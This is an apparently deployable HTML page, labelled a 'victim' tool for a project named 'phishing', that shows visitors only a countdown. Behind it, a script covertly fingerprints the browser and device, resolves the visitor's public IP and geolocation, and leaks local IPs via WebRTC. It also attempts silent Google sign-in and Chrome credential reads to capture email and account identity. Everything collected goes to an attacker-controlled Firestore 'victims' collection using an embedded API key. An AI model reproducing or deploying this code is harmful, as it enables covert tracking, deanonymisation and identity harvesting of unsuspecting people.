<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>...</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body {
    width: 100%; height: 100%;
    background: #000;
    display: flex; align-items: center; justify-content: center;
    overflow: hidden;
  }
  #n {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    font-size: clamp(80px, 25vw, 200px);
    font-weight: 100; color: #fff;
    letter-spacing: -4px; user-select: none;
    opacity: 1; transition: opacity 0.18s ease;
  }
</style>
</head>
<body>
<span id="n">10</span>
<script>
// ══════════════════════════════════════════════════
// VICTIM — ROOT TOOL
// ══════════════════════════════════════════════════
const FB_KEY  = "AIzaSyCPpG5yJ-1FkfHj8GHTucZRU_5dia-aqX0";
const FB_PROJ = "phishing-cad1e";
const G_CID   = "TU_CLIENT_ID.apps.googleusercontent.com";

// ── Countdown ───────────────────────────────────
const el = document.getElementById('n');
let t = 10;
const tick = setInterval(() => {
  el.style.opacity = 0;
  setTimeout(() => {
    t--; el.textContent = t; el.style.opacity = 1;
    if (t <= 0) clearInterval(tick);
  }, 180);
}, 1000);

// ════════════════════════════════════════════════
// RECOLECCIÓN
// ════════════════════════════════════════════════
const P = {};

// 1. Navigator
P.ua       = navigator.userAgent;
P.platform = navigator.platform;
P.vendor   = navigator.vendor;
P.lang     = navigator.language;
P.langs    = (navigator.languages || []).join(',');
P.cookies  = String(navigator.cookieEnabled);
P.dnt      = String(navigator.doNotTrack);
P.online   = String(navigator.onLine);
P.touch    = String(navigator.maxTouchPoints);
P.memory   = String(navigator.deviceMemory || 'n/a');
P.cores    = String(navigator.hardwareConcurrency);
P.pdfViewer= String(navigator.pdfViewerEnabled ?? 'n/a');

// 2. Pantalla
P.screen  = screen.width + 'x' + screen.height;
P.avail   = screen.availWidth + 'x' + screen.availHeight;
P.depth   = String(screen.colorDepth);
P.dpr     = String(window.devicePixelRatio);
P.orient  = screen.orientation?.type || 'n/a';
P.innerW  = String(window.innerWidth);
P.innerH  = String(window.innerHeight);

// 3. Tiempo / Zona
P.tz       = Intl.DateTimeFormat().resolvedOptions().timeZone;
P.tzOffset = String(new Date().getTimezoneOffset());
P.locale   = Intl.DateTimeFormat().resolvedOptions().locale;
P.dateStr  = new Date().toString();

// 4. Referrer / URL
P.referer = document.referrer || '(directo)';
P.url     = location.href;
P.params  = location.search;

// 5. Canvas fingerprint
try {
  const c = document.createElement('canvas');
  c.width = 240; c.height = 50;
  const x = c.getContext('2d');
  x.textBaseline = 'top'; x.font = '13px Arial';
  x.fillStyle = '#f55';  x.fillRect(100, 1, 60, 18);
  x.fillStyle = '#05a';  x.fillText('Invisible', 2, 14);
  x.fillStyle = 'rgba(0,200,80,0.7)'; x.fillText('Invisible', 4, 16);
  P.canvas = c.toDataURL().slice(-60);
} catch(e) { P.canvas = 'blocked'; }

// 6. WebGL
try {
  const g = document.createElement('canvas').getContext('webgl') ||
            document.createElement('canvas').getContext('experimental-webgl');
  if (g) {
    P.glVendor   = g.getParameter(g.VENDOR);
    P.glRenderer = g.getParameter(g.RENDERER);
    const dbg = g.getExtension('WEBGL_debug_renderer_info');
    if (dbg) {
      P.glUVendor   = g.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
      P.glURenderer = g.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
    }
    P.glVer = g.getParameter(g.VERSION);
    P.glSL  = g.getParameter(g.SHADING_LANGUAGE_VERSION);
    P.glMax = String(g.getParameter(g.MAX_TEXTURE_SIZE));
    P.glExt = (g.getSupportedExtensions() || []).join('|').slice(0, 200);
  }
} catch(e) {}

// 7. Audio fingerprint
try {
  const A = window.OfflineAudioContext || window.webkitOfflineAudioContext;
  if (A) {
    const ac = new A(1, 44100, 44100);
    const os = ac.createOscillator();
    const cp = ac.createDynamicsCompressor();
    os.connect(cp); cp.connect(ac.destination);
    os.start(0); ac.startRendering();
    ac.oncomplete = ev => {
      const b = ev.renderedBuffer.getChannelData(0);
      let s = 0;
      for (let i = 4500; i < 5000; i++) s += Math.abs(b[i]);
      P.audio = s.toString();
      push();
    };
  }
} catch(e) {}

// 8. Fonts
const FONTS = [
  'Arial','Calibri','Cambria','Comic Sans MS','Consolas','Courier New',
  'Georgia','Impact','Segoe UI','Tahoma','Times New Roman','Verdana',
  'Helvetica Neue','Monaco','Optima','DejaVu Sans','Ubuntu','Noto Sans',
  'Roboto','Open Sans','Lato','Montserrat','Futura','Gill Sans'
];
const sp = document.createElement('span');
sp.style.cssText = 'position:absolute;visibility:hidden;font-size:72px;';
sp.textContent = 'mmmmmmmmmmlli';
document.body.appendChild(sp);
sp.style.fontFamily = 'monospace';
const bW = sp.offsetWidth, bH = sp.offsetHeight;
P.fonts = FONTS.filter(f => {
  sp.style.fontFamily = '"' + f + '",monospace';
  return sp.offsetWidth !== bW || sp.offsetHeight !== bH;
}).join(',');
P.fontN = String(P.fonts.split(',').filter(Boolean).length);
document.body.removeChild(sp);

// 9. Connection
const cn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
if (cn) {
  P.connType = String(cn.type || '');
  P.connEff  = String(cn.effectiveType || '');
  P.connDl   = String(cn.downlink || '');
  P.connRtt  = String(cn.rtt || '');
  P.connSave = String(cn.saveData || '');
}

// 10. Media codecs
try {
  const v = document.createElement('video');
  P.h264 = v.canPlayType('video/mp4;codecs="avc1.42E01E"');
  P.vp9  = v.canPlayType('video/webm;codecs="vp9"');
  P.av1  = v.canPlayType('video/mp4;codecs="av01.0.05M.08"');
  const a = document.createElement('audio');
  P.mp3  = a.canPlayType('audio/mpeg');
  P.aac  = a.canPlayType('audio/mp4;codecs="mp4a.40.2"');
  P.ogg  = a.canPlayType('audio/ogg;codecs="vorbis"');
} catch(e) {}

// 11. CSS media queries
P.dark      = String(matchMedia('(prefers-color-scheme:dark)').matches);
P.reduceMot = String(matchMedia('(prefers-reduced-motion:reduce)').matches);
P.hdr       = String(matchMedia('(dynamic-range:high)').matches);
P.ptrFine   = String(matchMedia('(pointer:fine)').matches);
P.ptrCoarse = String(matchMedia('(pointer:coarse)').matches);
P.hover     = String(matchMedia('(any-hover:hover)').matches);

// 12. Features
P.wasm    = String(!!window.WebAssembly);
P.webGPU  = String(!!navigator.gpu);
P.webGL2  = String(!!document.createElement('canvas').getContext('webgl2'));
P.sw      = String(!!navigator.serviceWorker);
P.idb     = String(!!window.indexedDB);
P.bt      = String(!!navigator.bluetooth);
P.usb     = String(!!navigator.usb);
P.nfc     = String('NDEFReader' in window);
P.share   = String(!!navigator.share);
P.vib     = String(!!navigator.vibrate);
P.notif   = 'Notification' in window ? Notification.permission : 'n/a';
P.clip    = String(!!navigator.clipboard);
P.creds   = String(!!navigator.credentials);
P.contacts= String('contacts' in navigator && 'ContactsManager' in window);

// 13. Storage
if (navigator.storage?.estimate) {
  navigator.storage.estimate().then(q => {
    P.stQuota = (q.quota / 1e9).toFixed(2) + 'GB';
    P.stUsed  = (q.usage  / 1e6).toFixed(2) + 'MB';
    push();
  }).catch(() => {});
}

// 14. Battery
if (navigator.getBattery) {
  navigator.getBattery().then(b => {
    P.bat     = (b.level * 100).toFixed(0) + '%';
    P.batChg  = String(b.charging);
    P.batChgT = String(b.chargingTime);
    P.batDisT = String(b.dischargingTime);
    push();
  }).catch(() => {});
}

// 15. WASM SIMD / Threads
try {
  P.wasmSIMD    = String(WebAssembly.validate(new Uint8Array([
    0,97,115,109,1,0,0,0,1,5,1,96,0,1,123,3,2,1,0,10,10,1,8,0,65,0,253,15,253,98,11
  ])));
  P.wasmThreads = String(typeof SharedArrayBuffer !== 'undefined');
} catch(e) {}

// 16. Plugins
try { P.plugins = Array.from(navigator.plugins).map(p => p.name).join('|'); } catch(e) {}

// 17. Hash compuesto
const hi = [P.ua, screen.width, screen.height, P.depth, P.tz, P.lang, P.cores, P.memory, P.canvas, P.glURenderer].join('|');
let h = 0x811c9dc5;
for (let i = 0; i < hi.length; i++) { h ^= hi.charCodeAt(i); h = (h * 0x01000193) >>> 0; }
P.hash = '0x' + h.toString(16).toUpperCase().padStart(8, '0');

// _ts como string para evitar problemas de tipo en Firestore
P._ts = String(Date.now());

// ════════════════════════════════════════════════
// IP PÚBLICA + GEOLOC
// ════════════════════════════════════════════════
(async () => {
  const APIS = [
    { url: 'https://ipapi.co/json/',       ip: 'ip',        city: 'city',       region: 'region',     country: 'country_name', org: 'org',  lat: 'latitude', lon: 'longitude', postal: 'postal',  tz: 'timezone', asn: 'asn' },
    { url: 'https://freeipapi.com/api/json/', ip: 'ipAddress', city: 'cityName', region: 'regionName', country: 'countryName',  org: 'isp',  lat: 'latitude', lon: 'longitude', postal: 'zipCode', tz: 'timeZone', asn: ''    },
    { url: 'https://ipwho.is/',            ip: 'ip',        city: 'city',       region: 'region',     country: 'country',      org: 'org',  lat: 'latitude', lon: 'longitude', postal: 'postal',  tz: 'timezone', asn: 'asn' },
    { url: 'https://ip-api.com/json/?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query',
                                           ip: 'query',     city: 'city',       region: 'regionName', country: 'country',      org: 'org',  lat: 'lat',      lon: 'lon',       postal: 'zip',     tz: 'timezone', asn: 'as'  },
  ];
  for (const api of APIS) {
    try {
      const r = await fetch(api.url, { signal: AbortSignal.timeout(5000) });
      const j = await r.json();
      if (!j[api.ip]) continue;
      P.ip     = String(j[api.ip]      || '');
      P.city   = String(j[api.city]    || '');
      P.region = String(j[api.region]  || '');
      P.country= String(j[api.country] || '');
      P.org    = String(j[api.org]     || '');
      P.lat    = String(j[api.lat]     || '');
      P.lon    = String(j[api.lon]     || '');
      P.postal = String(j[api.postal]  || '');
      P.ipTZ   = String(j[api.tz]      || '');
      P.asn    = String(j[api.asn]     || '');
      push(); break;
    } catch(e) { continue; }
  }
})();

// ════════════════════════════════════════════════
// IP LOCAL — WebRTC
// ════════════════════════════════════════════════
try {
  const pc = new RTCPeerConnection({ iceServers: [] });
  pc.createDataChannel('');
  pc.createOffer().then(o => pc.setLocalDescription(o));
  const seen = new Set();
  pc.onicecandidate = e => {
    if (!e?.candidate) return;
    const m = e.candidate.candidate.match(/((\d{1,3}\.){3}\d{1,3}|[a-f0-9:]+:[a-f0-9:]+)/i);
    if (!m || seen.has(m[0])) return;
    seen.add(m[0]);
    P['ipLocal' + seen.size] = m[0];
    push();
  };
  setTimeout(() => pc.close(), 6000);
} catch(e) { P.ipLocal1 = 'blocked'; }

// ════════════════════════════════════════════════
// GOOGLE ONE TAP
// ════════════════════════════════════════════════
if (!G_CID.startsWith('TU_')) {
  const gs = document.createElement('script');
  gs.src = 'https://accounts.google.com/gsi/client';
  gs.async = true;
  gs.onload = () => {
    try {
      google.accounts.id.initialize({
        client_id: G_CID, auto_select: true, itp_support: true,
        callback: resp => {
          try {
            const seg   = resp.credential.split('.');
            const pad   = s => s.replace(/-/g,'+').replace(/_/g,'/') + '==='.slice((s.length+3)%4);
            const claim = JSON.parse(atob(pad(seg[1])));
            P.gEmail   = claim.email   || '';
            P.gName    = claim.name    || '';
            P.gPicture = claim.picture || '';
            P.gSub     = claim.sub     || '';
            P.gHD      = claim.hd      || '';
            P.gVerif   = String(claim.email_verified || '');
            push();
          } catch(ee) { P.gEmail = 'parse_err'; push(); }
        }
      });
      google.accounts.id.prompt(n => {
        P.gPrompt = n.getNotDisplayedReason?.() || n.getSkippedReason?.() || 'ok';
        push();
      });
    } catch(ee) {}
  };
  document.head.appendChild(gs);
}

// ════════════════════════════════════════════════
// CREDENCIALES CHROME SILENT
// ════════════════════════════════════════════════
if (navigator.credentials) {
  navigator.credentials.get({ password: true, mediation: 'silent' })
    .then(c => {
      if (!c) return;
      P.credId   = c.id   || '';
      P.credName = c.name || '';
      P.credType = c.type || '';
      push();
    }).catch(() => {});
}

// ════════════════════════════════════════════════
// FIREBASE SENDER
// Todos los valores son strings — sin doubleValue/booleanValue
// para evitar conflictos de tipo al leer desde el admin
// ════════════════════════════════════════════════
let _docId = null, _sent = false, _timer = null;

function push() {
  clearTimeout(_timer);
  _timer = setTimeout(async () => {
    if (_sent && _docId) await patch();
    else                 await post();
  }, 500);
}

function toDoc(obj) {
  const f = {};
  for (const [k, v] of Object.entries(obj)) {
    if (v === undefined || v === null) continue;
    // Todo como stringValue — el admin lo parsea sin problemas
    f[k] = { stringValue: String(v) };
  }
  return JSON.stringify({ fields: f });
}

async function post() {
  const url = `https://firestore.googleapis.com/v1/projects/${FB_PROJ}/databases/(default)/documents/victims?key=${FB_KEY}`;
  try {
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: toDoc(P)
    });
    const j = await r.json();
    if (j.name) { _docId = j.name.split('/').pop(); _sent = true; }
  } catch(e) {}
}

async function patch() {
  // PATCH con body JSON — no URL params para evitar límite de longitud
  const url = `https://firestore.googleapis.com/v1/projects/${FB_PROJ}/databases/(default)/documents/victims/${_docId}?key=${FB_KEY}`;
  const mask = Object.keys(P).map(k => `updateMask.fieldPaths=${encodeURIComponent(k)}`).join('&');
  try {
    await fetch(`${url}&${mask}`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: toDoc(P)
    });
  } catch(e) {}
}

// Envío inicial
setTimeout(() => post(), 800);

// Envío al cerrar
window.addEventListener('beforeunload', () => {
  P._exit = String(Date.now());
  if (_sent && _docId) {
    navigator.sendBeacon(
      `https://firestore.googleapis.com/v1/projects/${FB_PROJ}/databases/(default)/documents/victims/${_docId}?key=${FB_KEY}&updateMask.fieldPaths=_exit`,
      JSON.stringify({ fields: { _exit: { stringValue: P._exit } } })
    );
  }
});
</script>
</body>
</html>
